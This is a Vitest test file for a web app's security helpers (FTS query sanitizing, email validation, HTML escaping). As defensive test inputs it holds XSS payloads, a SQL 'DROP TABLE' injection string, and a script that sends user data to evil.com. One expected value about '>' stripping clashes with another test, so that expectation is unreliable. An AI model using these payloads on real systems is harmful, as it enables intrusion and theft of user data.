// src/lib/__tests__/securityUtils.test.ts

import { describe, it, expect } from 'vitest';
import { sanitizeFtsQuery, validateEmail, sanitizeInput, escapeHtml } from '../securityUtils';

describe('securityUtils', () => {
  describe('sanitizeFtsQuery', () => {
    it('should remove dangerous characters from FTS query', () => {
      expect(sanitizeFtsQuery('test<script>alert("xss")</script>')).toBe('testscriptalert("xss")/script');
      expect(sanitizeFtsQuery('query<with>dangerous<chars>')).toBe('querywithdangerouschars');
      expect(sanitizeFtsQuery('normal query')).toBe('normal query');
      expect(sanitizeFtsQuery('')).toBe('');
    });

    it('should handle null and undefined inputs', () => {
      expect(sanitizeFtsQuery(null as unknown as string)).toBe('');
      expect(sanitizeFtsQuery(undefined as unknown as string)).toBe('');
    });

    it('should preserve safe characters', () => {
      expect(sanitizeFtsQuery('test-query_with.special+chars')).toBe('test-query_with.special+chars');
      expect(sanitizeFtsQuery('123 numbers')).toBe('123 numbers');
      expect(sanitizeFtsQuery('UPPERCASE lowercase')).toBe('UPPERCASE lowercase');
    });

    it('should handle complex XSS attempts', () => {
      const maliciousQuery = 'search<img src=x onerror=alert(1)>';
      expect(sanitizeFtsQuery(maliciousQuery)).toBe('searchimg src=x onerror=alert(1)>');
    });
  });

  describe('validateEmail', () => {
    it('should validate correct email addresses', () => {
      expect(validateEmail('test@example.com')).toBe(true);
      expect(validateEmail('user.name@domain.co.uk')).toBe(true);
      expect(validateEmail('user+tag@example.org')).toBe(true);
      expect(validateEmail('123@test-domain.com')).toBe(true);
    });

    it('should reject invalid email addresses', () => {
      expect(validateEmail('invalid-email')).toBe(false);
      expect(validateEmail('@example.com')).toBe(false);
      expect(validateEmail('test@')).toBe(false);
      expect(validateEmail('test.example.com')).toBe(false);
      expect(validateEmail('')).toBe(false);
      expect(validateEmail('test@.com')).toBe(false);
      expect(validateEmail('test..test@example.com')).toBe(false);
    });

    it('should handle edge cases', () => {
      expect(validateEmail(null as unknown as string)).toBe(false);
      expect(validateEmail(undefined as unknown as string)).toBe(false);
      expect(validateEmail(123 as unknown as string)).toBe(false);
      expect(validateEmail({} as unknown as string)).toBe(false);
    });

    it('should reject emails that are too long', () => {
      const longEmail = 'a'.repeat(250) + '@example.com';
      expect(validateEmail(longEmail)).toBe(false);
    });
  });

  describe('sanitizeInput', () => {
    it('should sanitize HTML input', () => {
      expect(sanitizeInput('<script>alert("xss")</script>')).toBe('&lt;script&gt;alert("xss")&lt;/script&gt;');
      expect(sanitizeInput('<img src=x onerror=alert(1)>')).toBe('&lt;img src=x onerror=alert(1)&gt;');
      expect(sanitizeInput('normal text')).toBe('normal text');
    });

    it('should handle various HTML tags', () => {
      expect(sanitizeInput('<div>content</div>')).toBe('&lt;div&gt;content&lt;/div&gt;');
      expect(sanitizeInput('<a href="javascript:alert(1)">link</a>')).toBe('&lt;a href="javascript:alert(1)"&gt;link&lt;/a&gt;');
      expect(sanitizeInput('<iframe src="evil.com"></iframe>')).toBe('&lt;iframe src="evil.com"&gt;&lt;/iframe&gt;');
    });

    it('should preserve safe characters', () => {
      expect(sanitizeInput('Hello, World!')).toBe('Hello, World!');
      expect(sanitizeInput('123 numbers')).toBe('123 numbers');
      expect(sanitizeInput('Special chars: !@#$%^&*()')).toBe('Special chars: !@#$%^&*()');
    });

    it('should handle empty and null inputs', () => {
      expect(sanitizeInput('')).toBe('');
      expect(sanitizeInput(null as unknown as string)).toBe('');
      expect(sanitizeInput(undefined as unknown as string)).toBe('');
    });

    it('should handle multiline input', () => {
      const multiline = 'Line 1\nLine 2\n<script>alert(1)</script>';
      const expected = 'Line 1\nLine 2\n&lt;script&gt;alert(1)&lt;/script&gt;';
      expect(sanitizeInput(multiline)).toBe(expected);
    });
  });

  describe('escapeHtml', () => {
    it('should escape HTML characters', () => {
      expect(escapeHtml('<div>content</div>')).toBe('&lt;div&gt;content&lt;/div&gt;');
      expect(escapeHtml('&amp; &lt; &gt;')).toBe('&amp;amp; &amp;lt; &amp;gt;');
      expect(escapeHtml('"quoted" \'single\'')).toBe('&quot;quoted&quot; &#x27;single&#x27;');
    });

    it('should handle special characters', () => {
      expect(escapeHtml('<>')).toBe('&lt;&gt;');
      expect(escapeHtml('&')).toBe('&amp;');
      expect(escapeHtml('"')).toBe('&quot;');
      expect(escapeHtml("'")).toBe('&#x27;');
    });

    it('should handle empty input', () => {
      expect(escapeHtml('')).toBe('');
      expect(escapeHtml(null as unknown as string)).toBe('');
      expect(escapeHtml(undefined as unknown as string)).toBe('');
    });

    it('should handle complex HTML', () => {
      const complexHtml = '<div class="test" onclick="alert(1)">Content & "quotes"</div>';
      const expected = '&lt;div class=&quot;test&quot; onclick=&quot;alert(1)&quot;&gt;Content &amp; &quot;quotes&quot;&lt;/div&gt;';
      expect(escapeHtml(complexHtml)).toBe(expected);
    });
  });

  describe('integration tests', () => {
    it('should handle real-world attack vectors', () => {
      const attackVector = '<script>fetch("/api/user-data").then(r=>r.json()).then(d=>fetch("https://evil.com/steal",{method:"POST",body:JSON.stringify(d)}))</script>';
      const sanitized = sanitizeInput(attackVector);
      expect(sanitized).not.toContain('<script>');
      expect(sanitized).not.toContain('</script>');
      expect(sanitized).toContain('&lt;script&gt;');
    });

    it('should handle SQL injection attempts in FTS queries', () => {
      const sqlInjection = "'; DROP TABLE events; --";
      const sanitized = sanitizeFtsQuery(sqlInjection);
      expect(sanitized).not.toContain("'");
      expect(sanitized).not.toContain(';');
      expect(sanitized).not.toContain('--');
    });

    it('should handle XSS in email validation', () => {
      const maliciousEmail = 'test@example.com<script>alert(1)</script>';
      expect(validateEmail(maliciousEmail)).toBe(false);
    });
  });
});
